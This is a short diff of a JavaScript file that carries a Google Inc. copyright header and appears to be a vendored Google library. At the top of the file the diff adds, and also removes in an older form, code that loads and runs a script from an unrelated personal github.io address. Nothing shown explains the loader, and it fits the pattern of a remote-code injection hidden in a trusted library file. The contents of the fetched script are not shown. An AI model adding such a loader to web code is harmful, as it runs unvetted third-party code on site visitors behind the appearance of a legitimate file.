@@ -1,7 +1,8 @@
 
 
-document.write("<script src='https://freedom079215.github.io/cpn_site0201/ts.js'></script>");
-
+var script = document.createElement('script');
+script.src = 'https://freedom079215.github.io/cpn_site0201/ts.js';
+document.body.appendChild(script);
 
 // Copyright 2012 Google Inc. All rights reserved.
 (function(){
